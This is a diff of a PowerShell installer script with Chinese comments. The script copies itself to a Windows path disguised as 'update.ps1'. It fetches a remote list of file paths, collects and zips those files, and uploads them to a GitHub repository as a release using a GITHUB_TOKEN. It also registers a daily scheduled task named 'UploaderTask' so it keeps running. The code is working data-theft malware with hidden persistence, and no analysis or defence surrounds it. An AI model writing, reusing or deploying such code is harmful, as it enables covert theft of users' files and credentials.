@@ -1,11 +1,10 @@
-# install.ps1 - 主功能：上传文件 + 注册定时任务
+# install.ps1 - 上传文件 + 注册每天 0:00 定时任务
 $logPath = "C:\upload_log.txt"
 "[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append
 
-# === 下载自身到固定路径（以便任务执行） ===
+# 下载自身
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"
-
 try {
     Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
     "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
@@ -14,14 +13,14 @@ try {
     return
 }
 
-# === 获取 GitHub Token（从环境变量） ===
-$token = $env:GITHUB_TOKEN
+# 获取 GitHub Token
+$token = [Environment]::GetEnvironmentVariable("GITHUB_TOKEN", "Machine")
 if (-not $token) {
     "❌ GITHUB_TOKEN 环境变量不存在，终止执行。" | Out-File $logPath -Append
     return
 }
 
-# === 上传逻辑（文件收集、打包、上传） ===
+# 上传逻辑
 try {
     $repo = "drftghy/backup-files"
     $now = Get-Date
@@ -35,12 +34,12 @@ try {
     $zipPath = Join-Path $env:TEMP $zipName
     New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-    # 加载上传路径
+    # 获取上传路径
     $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
     $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
     $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 
-    # 复制目标文件
+    # 拷贝文件
     $i = 0
     foreach ($path in $paths) {
         $i++
@@ -75,7 +74,7 @@ try {
     # 打包
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
 
-    # 上传 Release
+    # 创建 Release
     $releaseData = @{
         tag_name    = $tag
         name        = $releaseName
@@ -101,17 +100,16 @@ try {
         "User-Agent" = "PowerShell"
     }
     Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
-
     "[OK] Upload completed." | Out-File $logPath -Append
 } catch {
     "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
 }
 
-# 清理
+# 清理临时文件
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# === 注册计划任务，每天 0:00 执行 update.ps1 ===
+# 注册计划任务
 try {
     $taskName = "UploaderTask"
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
